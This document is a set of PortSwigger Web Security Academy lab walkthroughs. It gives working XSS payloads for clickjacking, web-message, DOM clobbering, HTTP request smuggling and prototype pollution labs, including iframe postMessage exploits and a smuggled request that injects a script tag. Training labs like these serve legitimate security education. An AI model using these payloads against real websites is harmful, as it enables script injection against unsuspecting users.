########### https://portswigger.net/web-security/clickjacking/lab-exploiting-to-trigger-dom-based-xss

Go to the exploit server and paste the following HTML template into the Body section:
<style>
	iframe {
		position:relative;
		width:$width_value;
		height: $height_value;
		opacity: $opacity;
		z-index: 2;
	}
	div {
		position:absolute;
		top:$top_value;
		left:$side_value;
		z-index: 1;
	}
</style>
<div>Test me</div>
<iframe src="https://YOUR-LAB-ID.web-security-academy.net/feedback?name=<img src=1 onerror=print()>&email=hacker@attacker-website.com&subject=test&message=test#feedbackResult"></iframe>
or
<iframe src="https://YOUR-LAB-ID.web-security-academy.net/feedback?name=<img src=1 onerror=alert('XSS')>&email=hacker@attacker-website.com&subject=test&message=test#feedbackResult"></iframe>

########### https://portswigger.net/web-security/dom-based/controlling-the-web-message-source/lab-dom-xss-using-web-messages

Notice that the home page contains an addEventListener() call that listens for a web message.

Go to the exploit server and add the following iframe to the body. Remember to add your own lab ID:
    <iframe src="https://YOUR-LAB-ID.web-security-academy.net/" onload="this.contentWindow.postMessage('<img src=1 onerror=print()>','*')">
	or 
    <iframe src="https://YOUR-LAB-ID.web-security-academy.net/" onload="this.contentWindow.postMessage('<img src=1 onerror=alert('XSS')>','*')">
    
Store the exploit and deliver it to the victim.

When the iframe loads, the postMessage() method sends a web message to the home page. The event listener, which is intended to serve ads, 
takes the content of the web message and inserts it into the div with the ID ads. However, in this case it inserts our img tag, 
which contains an invalid src attribute. This throws an error, which causes the onerror event handler to execute our payload.

########### https://portswigger.net/web-security/dom-based/controlling-the-web-message-source/lab-dom-xss-using-web-messages-and-a-javascript-url

Notice that the home page contains an addEventListener() call that listens for a web message. The JavaScript contains a flawed indexOf() 
check that looks for the strings "http:" or "https:" anywhere within the web message. It also contains the sink location.href.

Go to the exploit server and add the following iframe to the body, remembering to replace YOUR-LAB-ID with your lab ID:
    <iframe src="https://YOUR-LAB-ID.web-security-academy.net/" onload="this.contentWindow.postMessage('javascript:print()//http:','*')">
	or 
    <iframe src="https://YOUR-LAB-ID.web-security-academy.net/" onload="this.contentWindow.postMessage('javascript:alert(1)//http:','*')">
    
Store the exploit and deliver it to the victim.

This script sends a web message containing an arbitrary JavaScript payload, along with the string "http:". The second argument 
specifies that any targetOrigin is allowed for the web message.

When the iframe loads, the postMessage() method sends the JavaScript payload to the main page. The event listener spots the "http:" 
string and proceeds to send the payload to the location.href sink, where the print() function is called.

########### https://portswigger.net/web-security/dom-based/controlling-the-web-message-source/lab-dom-xss-using-web-messages-and-json-parse

Notice that the home page contains an event listener that listens for a web message. This event listener expects 
a string that is parsed using JSON.parse(). In the JavaScript, we can see that the event listener expects a type property 
and that the load-channel case of the switch statement changes the iframe src attribute.

Go to the exploit server and add the following iframe to the body, remembering to replace YOUR-LAB-ID with your lab ID:
    <iframe src=https://YOUR-LAB-ID.web-security-academy.net/ onload='this.contentWindow.postMessage("{\"type\":\"load-channel\",\"url\":\"javascript:print()\"}","*")'>
	or 
    <iframe src=https://YOUR-LAB-ID.web-security-academy.net/ onload='this.contentWindow.postMessage("{\"type\":\"load-channel\",\"url\":\"javascript:alert(1)\"}","*")'>

Store the exploit and deliver it to the victim.

When the iframe we constructed loads, the postMessage() method sends a web message to the home page with the type load-channel. The event listener receives the message and parses it using JSON.parse() before sending it to the switch.

The switch triggers the load-channel case, which assigns the url property of the message to the src attribute of the ACMEplayer.element iframe. However, in this case, the url property of the message actually contains our JavaScript payload.

As the second argument specifies that any targetOrigin is allowed for the web message, and the event handler does not contain any form of origin check, the payload is set as the src of the ACMEplayer.element iframe. The print() function is called when the victim loads the page in their browser.

########### https://portswigger.net/web-security/dom-based/dom-clobbering/lab-dom-xss-exploiting-dom-clobbering

Go to one of the blog posts and create a comment containing the following anchors:
    <a id=defaultAvatar><a id=defaultAvatar name=avatar href="cid:&quot;onerror=alert(1)//">
    
Return to the blog post and create a second comment containing any random text. The next time the page loads, the alert() is called.

########### https://portswigger.net/web-security/request-smuggling/exploiting/lab-deliver-reflected-xss

Visit a blog post, and send the request to Burp Repeater.
    
Observe that the comment form contains your User-Agent header in a hidden input.

Inject an XSS payload into the User-Agent header and observe that it gets reflected:
    "/><script>alert(1)</script>

Smuggle this XSS request to the back-end server, so that it exploits the next visitor:
    POST / HTTP/1.1
    Host: YOUR-LAB-ID.web-security-academy.net
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 150
    Transfer-Encoding: chunked

    0

    GET /post?postId=5 HTTP/1.1
    User-Agent: a"/><script>alert(1)</script>
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 5

    x=1

Note that the target user only browses the website intermittently so you may need to repeat this attack a few times before it's successful.

########### https://portswigger.net/web-security/prototype-pollution/finding/lab-prototype-pollution-dom-xss-via-client-side-prototype-pollution

Find a prototype pollution source

    In your browser, try polluting the Object.prototype by injecting an arbitrary property via the query string:
    /?__proto__[foo]=bar

    Open the browser DevTools panel and go to the Console tab.

    Enter Object.prototype.

    Study the properties of the returned object. Observe that it now has a foo property with the value bar. 
You've successfully found a prototype pollution source.

Identify a gadget

    In the browser DevTools panel, go to the Sources tab.

    Study the JavaScript files that are loaded by the target site and look for any DOM XSS sinks.

    In searchLogger.js, notice that if the config object has a transport_url property, this is used to dynamically append a script to the DOM.

    Notice that no transport_url property is defined for the config object. This is a potential gadget for controlling the src of the <script> element.

Craft an exploit

    Using the prototype pollution source you identified earlier, try injecting an arbitrary transport_url property:
    /?__proto__[transport_url]=foo

    In the browser DevTools panel, go to the Elements tab and study the HTML content of the page. 
Observe that a <script> element has been rendered on the page, with the src attribute foo.

    Modify the payload in the URL to inject an XSS proof-of-concept. For example, you can use a data: URL as follows:
    /?__proto__[transport_url]=data:,alert(1);

    Observe that the alert(1) is called and the lab is solved.


